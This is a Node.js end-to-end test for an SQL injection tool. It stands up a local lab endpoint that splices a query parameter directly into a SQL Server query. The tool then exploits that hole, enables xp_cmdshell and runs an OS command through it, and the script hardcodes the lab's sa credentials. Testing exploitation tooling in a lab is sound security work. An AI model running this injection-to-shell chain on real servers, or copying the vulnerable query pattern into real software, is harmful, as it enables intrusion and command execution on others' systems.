// ============================================================================
// e2e/mssql-lab/osshell.e2e.mjs —— MSSQL xp_cmdshell os-shell 真机闭环
// ============================================================================
// 目的：Exploiter.msOsShell 此前只有 mock 单测。本脚本用 SQL Server 2022 Express
// 真机（e2e/mssql-lab 同环境）走完整链路：
//   1. 引擎扫描 /num 数值型堆叠注入点（真拼 SQL → 真 MSSQL）
//   2. Exploiter.osShell('cmd /c echo <marker>')：
//      xp_cmdshell 默认关闭 → 自动 sp_configure 启用（需 sysadmin）→
//      INSERT #tmp EXEC master..xp_cmdshell → UNION 回显读临时表
//   3. 外部事实断言：回显值包含 marker 令牌
// 前提：注入连接用户为 sysadmin（sa 符合；真实场景中 xp_cmdshell 自动启用
// 需要该权限，无权限时引擎返回 ok:true 但 value 为执行空——与 sqlmap 行为一致）。
// ============================================================================
import { pathToFileURL } from 'node:url';
import { dirname, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';
import { createRequire } from 'node:module';

const HERE = dirname(fileURLToPath(import.meta.url));
const ROOT = resolve(HERE, '../..');
const _require = createRequire(resolve(ROOT, 'server/package.json'));
const sql = _require('mssql');

const { ScanManager } = await import(pathToFileURL(resolve(ROOT, 'server/src/engine/ScanManager.js')).href);
const { Exploiter } = await import(pathToFileURL(resolve(ROOT, 'server/src/engine/Exploiter.js')).href);
const { connectMssqlOrSkip } = await import(pathToFileURL(resolve(ROOT, 'e2e/lib/dbProbe.mjs')).href);

const PORT = Number(process.env.MSSQL_LAB_PORT) || 8284;
const SQL_PORT = Number(process.env.MSSQL_TCP_PORT) || 65039;
const BASE = `http://127.0.0.1:${PORT}`;
const SQL = { server: '127.0.0.1', port: SQL_PORT, user: 'sa', password: 'SqLi_2026_T!', database: 'sqli_lab_mssql', options: { trustServerCertificate: true, encrypt: false } };

// 前置：MSSQL 可连 + 确认 xp_cmdshell 初始状态
// [SKIP 出口 2026-09-22] 见 e2e/lib/dbProbe.mjs：环境缺项 → [SKIP] + exit 0，不放水。
const admin = await connectMssqlOrSkip(sql, SQL);
const xpc = await admin.request().query("SELECT CAST(value_in_use AS INT) AS v FROM sys.configurations WHERE name = 'xp_cmdshell'");
const initialXp = xpc.recordset[0].v;
console.log(`[pre] SQL Server @ ${SQL_PORT} | xp_cmdshell 初始 value_in_use=${initialXp}`);
if (initialXp === 1) {
  // 留一个干净起点：先关掉，让引擎的 auto-enable 路径也被真实覆盖
  await admin.request().query("EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE");
  console.log('[pre] xp_cmdshell 已复位为 0（覆盖 auto-enable 路径）');
}

// 靶场（与 mssql-lab e2e 同款 /num 堆叠注入点）
const app = _require('express');
// 复用上面已验证过的池：mssql 驱动的 sql.connect 本身是全局单例，
// 同配置二次调用返回同一池，但**显式复用**才表达出「同一个已探活的连接」这层语义。
const pool = admin;
const expressApp = app();
expressApp.get('/num', async (req, res) => {
  const id = String(req.query.id ?? '1');
  try {
    const r = await pool.request().query(`SELECT id, username, email FROM users WHERE id = ${id}`);
    const rowsHtml = (r.recordset || []).map((x) => `<tr><td>${x.id}</td><td>${x.username}</td><td>${x.email}</td></tr>`).join('');
    res.send(`<!DOCTYPE html><html><body><h1>User</h1><table border="1">${rowsHtml}</table></body></html>`);
  } catch (e) { res.status(500).send('Query error: ' + e.message); }
});
const server = expressApp.listen(PORT, '127.0.0.1');
await new Promise((resolve, reject) => {
  server.once('listening', resolve);
  server.once('error', (e) => reject(new Error('[mssql-oshell] 靶场端口监听失败（被占用？先杀残留进程）: ' + e.message)));
});
console.log(`[step1] 靶场就绪 ${BASE}/num?id=1`);

// 引擎扫描拿注入点
const sm = new ScanManager();
const scanId = await sm.start({ url: `${BASE}/num?id=1`, config: { concurrency: 2, ratePerSec: 0, retry: 0, timeoutMs: 15000, techniques: ['union'], dbms: 'SQL Server' } });
const t0 = Date.now();
for (;;) { const s = sm.scans.get(scanId); if (s && (s.status === 'completed' || s.status === 'error')) break; if (Date.now() - t0 > 120000) break; await new Promise((r) => setTimeout(r, 40)); }
const report = sm.getReport(scanId) || {};
const vuln = (report.vulns || [])[0];
const point = (report.points || []).find((p) => p.id === vuln?.pointId) || (report.points || [])[0];
if (!vuln || !point) { console.log('[FAIL] 未取得注入点'); server.close(); await pool.close(); await admin.close(); process.exit(1); }
const target = report.target || { url: BASE };
const ctx = { httpClient: sm.getScanClient(scanId, target), config: target.config || {}, target, point, dbms: 'SQL Server' };
console.log(`[step2] 注入点 ${point.id}（boundary=${JSON.stringify(point.boundary)}）`);

// os-shell 闭环
const exploiter = new Exploiter();
const marker = `msshell_${Date.now() % 100000}`;
const osRes = await exploiter.osShell(ctx, `cmd /c echo ${marker}`);
const outVal = String(osRes.value ?? '').trim();
const ok = osRes.ok === true && outVal.includes(marker);
console.log(`[step3] osShell → ${JSON.stringify({ ok: osRes.ok, value: outVal.slice(0, 80), autoEnabled: osRes.autoEnabled ?? false, error: osRes.error ?? null })}`);
console.log(`\n[${ok ? 'PASS' : 'FAIL'}] MSSQL xp_cmdshell os-shell 真机闭环（含 auto-enable 路径）marker=${ok ? '命中' : '未命中'}`);

// 复原：xp_cmdshell 关回 0（不留已改配置）
const after = await admin.request().query("SELECT CAST(value_in_use AS INT) AS v FROM sys.configurations WHERE name = 'xp_cmdshell'");
if (after.recordset[0].v === 1) {
  await admin.request().query("EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE");
  console.log('[cleanup] xp_cmdshell 已复原为 0');
}

server.close();
await pool.close();
await admin.close();
process.exit(ok ? 0 : 1);
